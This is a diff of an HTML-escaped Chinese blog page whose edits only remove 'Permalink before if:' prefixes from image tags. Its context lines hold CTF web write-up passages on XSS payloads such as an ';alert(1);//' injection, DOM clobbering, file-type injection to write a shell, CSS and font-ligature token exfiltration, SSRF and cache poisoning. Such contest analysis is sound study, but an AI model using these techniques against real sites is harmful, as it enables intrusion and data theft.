+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以发现在第一步渲染的时候，传入的&lt;code>&amp;lt;?&lt;/code>已经变成了&lt;code>&amp;lt;!--?--&amp;gt;&lt;/code>，存在&lt;code>--&amp;gt;&lt;/code>可以将注释闭合。可是这是为什么呢？&lt;/p>
@@ -6174,7 +6168,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>利用题目中原有的&lt;code>$(&amp;quot;#keanu&amp;quot;).popover(&amp;quot;show&amp;quot;);&lt;/code>来触发我们的 popover ，我们暂且先注释掉题目当中的延迟关闭的功能以便于我们观察。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>尽管 eval 执行出错，但是我们可以发现 number 标签当中确实被我们注入了一些其他的内容&lt;/p>
@@ -6206,7 +6200,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">number=&amp;#39;&amp;amp;name=&amp;lt;button id%3D&amp;#34;keanu&amp;#34; data-toggle%3D&amp;#34;popover&amp;#34; data-container%3D&amp;#34;%23number&amp;#34; data-content%3D&amp;#34;&amp;#39;%3Balert(1)%3B%2F%2F&amp;#34;&amp;gt;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="ww3">WW3
@@ -6315,7 +6309,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个题目让我深深地体会到了 JavaScript 的恶意&amp;hellip;先放个图，大家自行先体会一下，然后我们开始分析一下题目。&lt;/p>
-&lt;p>Permalink before if: https://i.redd.it/rz3o1yibnc511.png&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
+&lt;p>&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目用比较多的代码做了一个获取图片以及输出自定义 text 的功能，仍旧是上题的四个外部 JS 文件，以及一大段 JS 代码。本题涉及到 JavaScript 比较多的黑魔法，我们一个个来看看。&lt;/p>
@@ -6397,7 +6391,7 @@ loading="lazy"
 &lt;/div>&lt;p>用来进行 DOM 元素操作等，看起来我们的目标就是&lt;code>setTimeout&lt;/code>函数中通过&lt;code>$(&amp;quot;#notify&amp;quot;).html(html)&lt;/code>来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。&lt;/p>
 &lt;h3 id="dom-clobbering">DOM Clobbering
 &lt;/h3>&lt;p>首先我们先来看看几个比较有趣的例子：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>根据 MDN 文档&lt;/p>
@@ -6407,11 +6401,11 @@ loading="lazy"
 >same origin policy&lt;/a>.&lt;/p>
 &lt;/blockquote>
 &lt;p>这里的&lt;code>document.domain&lt;/code>并没有获取到我的域名&lt;code>zedd.vv&lt;/code>，反而是获取到了 img 标签，然后我们可以直接输出 document 对象来看看是怎么回事&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>通过这个例子我们可以知道，可以通过一些标签的 id(name) 属性来控制 document(window) 通过 DOM API(BOM API) 获取到的某个东西&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我查阅过相关资料，也询问过一些前端的专业人员，这里给我的解释是&amp;quot;document 和 window 两个变量，其实是 DOM 和 BOM 的规范，一般来说这两个不应该被当做普通的 JS 对象，但是规范与实现不同&amp;quot;，&amp;ldquo;都是因为上古遗留问题，现在哪有直接写 document.xxx 来获取元素的，TS 和 eslint 都会报错&amp;rdquo;。&lt;/p>
@@ -6586,7 +6580,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>原理都是一样的，这里&lt;code>test&lt;/code>函数在&lt;code>onerror&lt;/code>作用域找到了 x 变量，所以就不会再去找 window 作用域下的 &lt;code>x=false&lt;/code>变量了，所以本题我们需要引入一个&lt;code>name=notify&lt;/code>的标签来“覆盖”掉原来的 notify 变量。&lt;/p>
@@ -6628,7 +6622,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="jquerys-mxss">JQuery&amp;rsquo;s &amp;lsquo;mXSS&amp;rsquo;
@@ -6763,7 +6757,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到&lt;/p>
 &lt;p>最后再来一遍：&lt;/p>
-&lt;p>Permalink before if: https://i.redd.it/rz3o1yibnc511.png&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
+&lt;p>&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="references">References
@@ -6910,7 +6904,7 @@ loading="lazy"
 &lt;p>我的思路就是 fuzz 一些特殊的文件，可能存在某些文件使用&lt;code>finfo&lt;/code>得出来的结果含有单引号什么的，并且我们还能够插入可控数据，于是我就开始 fuzz 文件头，从&lt;code>0x00&lt;/code>到&lt;code>0xff0xff&lt;/code>。&lt;/p>
 &lt;p>终于在&lt;code>0x1f0x9d&lt;/code>得到一个文件类型是&lt;code>compress'd data&lt;/code>，虽然有单引号，但是不存在我们可控的数据。&lt;/p>
 &lt;p>还有一个是&lt;code>0xfb0x01&lt;/code>得到一个文件类型是&lt;code>QDOS object ''&lt;/code>，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现这里被吃掉了一个&lt;code>p&lt;/code>，于是我们调整一下 payload 就可以用来注入了。&lt;/p>
@@ -6932,14 +6926,14 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="other-file">other file
 &lt;/h3>&lt;p>看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。&lt;/p>
 &lt;h4 id="tex-dvi-file">TeX DVI file
 &lt;/h4>&lt;p>0xf702 文件头，在填充一定数据后有我们完全可控的数据&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="jpeg">jpeg
@@ -6952,21 +6946,21 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">exiftool -overwrite_original -comment&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;payload&amp;#34;&lt;/span> -software&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;payload2&amp;#34;&lt;/span> 1.jpg
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="heading">#!
 &lt;/h4>&lt;p>我们还可以利用&lt;code>#!/&lt;/code>的文件来构造 payload&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="gz">gz
 &lt;/h4>&lt;p>利用&lt;code>gunzip&lt;/code>生成的 gz 文件，我们也可以用来注入，我们可控的数据是它的文件名&lt;/p>
-&lt;p>Permalink before if: https://posts.xh4h.com/assets/images/36c3/gunzip1.png&lt;img src="https://posts.xh4h.com/assets/images/36c3/gunzip1.png"
+&lt;p>&lt;img src="https://posts.xh4h.com/assets/images/36c3/gunzip1.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然我们也可以直接修改 gz 文件内容&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="writeupbin">WriteUpBin
@@ -7230,7 +7224,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>&lt;code>data-parsley-trigger&lt;/code>指定了&lt;code>blur&lt;/code>事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>###Click&lt;/p>
@@ -7238,7 +7232,7 @@ loading="lazy"
 &lt;p>并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。&lt;/p>
 &lt;p>首先，因为&lt;code>find_element_by_xpath&lt;/code>只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。&lt;/p>
 &lt;p>但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。&lt;/p>
@@ -7325,7 +7319,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>拿到 writeup id 之后直接访问即可：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="other-selector">Other Selector
@@ -7712,7 +7706,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="keep-temp-file">Keep Temp File
@@ -7786,7 +7780,7 @@ loading="lazy"
 &lt;li>&lt;code>.well-known../files/&lt;/code>是nginx配置漏洞，就不多说了，用来列生成的tmp文件&lt;/li>
 &lt;/ol>
 &lt;p>由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>脚本放在&lt;a class="link" href="https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65" target="_blank" rel="noopener"
@@ -7949,7 +7943,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191119004834.png&lt;img src="https://blogpic.zdy.one/img/20191119004834.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119004834.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们这里收到了&lt;code>value^=&amp;quot;7&amp;quot;&lt;/code>选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1&lt;/p>
@@ -8326,7 +8320,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>效果如下图所示：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191119122947.png&lt;img src="https://blogpic.zdy.one/img/20191119122947.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119122947.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="token1---same-origin">Token1 - Same Origin
@@ -8397,7 +8391,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">iframe&lt;/span> &lt;span class="na">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://127.0.0.1:3000/token/78&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">iframe&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191119122446.png&lt;img src="https://blogpic.zdy.one/img/20191119122446.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119122446.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里&lt;code>zedd.vv&lt;/code>映射到了 127.0.0.1 ，可以看到因为不同源，&lt;code>zedd.vv&lt;/code>是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在&lt;code>Path=/&lt;/code>，所以我们能在父页面也能拿到 iframe 当中的 cookie&lt;/p>
@@ -8410,7 +8404,7 @@ loading="lazy"
 >连字那些事&lt;/a>&lt;/li>
 &lt;/ul>
 &lt;p>简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是&amp;quot;fi&amp;quot;序列。在下面的图片中，我们可以很清晰地看到&amp;quot;f&amp;quot;与&amp;quot;i&amp;quot;；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母&amp;quot;f&amp;quot;的顶部连接到&amp;quot;i&amp;quot;上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。&lt;/p>
-&lt;p>Permalink before if: https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png&lt;img src="https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png"
+&lt;p>&lt;img src="https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下：&lt;/p>
@@ -8604,7 +8598,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191119230534.png&lt;img src="https://blogpic.zdy.one/img/20191119230534.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191119230534.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>访问 test.html 之后我们可以看到收到了请求。&lt;/p>
@@ -9175,12 +9169,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>至于 width 为 500 px，是&lt;code>script&lt;/code>标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好&amp;hellip; svg horiz-adv-x 的参数也不是越大就能触发&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191120012326.png&lt;img src="https://blogpic.zdy.one/img/20191120012326.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120012326.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为&lt;code>display:table&lt;/code>的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。&lt;/p>
 &lt;p>而且还有一些问题就是缓存的问题，效果如下：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191120013522.png&lt;img src="https://blogpic.zdy.one/img/20191120013522.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120013522.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定&amp;hellip;用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。&lt;/p>
@@ -9619,17 +9613,17 @@ loading="lazy"
 &lt;h1 id="noxss">NOXSS
 &lt;/h1>&lt;p>终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。&lt;/p>
 &lt;p>随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用&lt;code>%0a&lt;/code>进行换行&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191120133900.png&lt;img src="https://blogpic.zdy.one/img/20191120133900.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120133900.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191120134348.png&lt;img src="https://blogpic.zdy.one/img/20191120134348.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191120134348.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。&lt;/p>
 &lt;p>根据文档&lt;a class="link" href="https://www.w3.org/TR/css-syntax-3/#newline-diagram" target="_blank" rel="noopener"
 >css newline&lt;/a>，我们可以知道换行有如下写法：&lt;/p>
-&lt;p>Permalink before if: https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png&lt;img src="https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png"
+&lt;p>&lt;img src="https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>而且文档里也提到了&lt;a class="link" href="https://www.w3.org/TR/css-syntax-3/#error-handling" target="_blank" rel="noopener"
@@ -9726,11 +9720,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191121002617.png&lt;img src="https://blogpic.zdy.one/img/20191121002617.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191121002617.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>And&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191121002928.png&lt;img src="https://blogpic.zdy.one/img/20191121002928.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191121002928.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>现场做出来的真是 CSS 带师 orz&amp;hellip;&lt;/p>
@@ -9748,7 +9742,7 @@ loading="lazy"
 >babyblog&lt;/a> 一致，有些功能还保留着，很有误导性&amp;hellip;以为是个升级版，前者是一道二次注入后用 php 正则&lt;code>/e&lt;/code>特性来执行命令的，所以我们一开始也就一直在日注入了&amp;hellip;&lt;/p>
 &lt;p>后来我发现&lt;code>/user&lt;/code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现&lt;code>/server_status&lt;/code>，发现有大家的访问记录。陷入思考ing&amp;hellip;&lt;/p>
 &lt;p>队友突然看到有一个访问记录&lt;code>/user/1.css&lt;/code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191109012449.png&lt;img src="https://blogpic.zdy.one/img/20191109012449.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109012449.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="babypress">babypress
@@ -10056,11 +10050,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191109024547.png&lt;img src="https://blogpic.zdy.one/img/20191109024547.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109024547.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191109020248.png&lt;img src="https://blogpic.zdy.one/img/20191109020248.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109020248.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="upload">upload
@@ -10245,10 +10239,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191109134834.png&lt;img src="https://blogpic.zdy.one/img/20191109134834.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109134834.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191109135000.png&lt;img src="https://blogpic.zdy.one/img/20191109135000.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191109135000.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="lfi2019">lfi2019
@@ -11120,7 +11114,7 @@ loading="lazy"
 >XCTF-2019-tfboys&lt;/a>&lt;/p>
 &lt;h1 id="conclusion">Conclusion
 &lt;/h1>&lt;p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191113235515.jpeg&lt;img src="https://blogpic.zdy.one/img/20191113235515.jpeg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113235515.jpeg"
 loading="lazy"
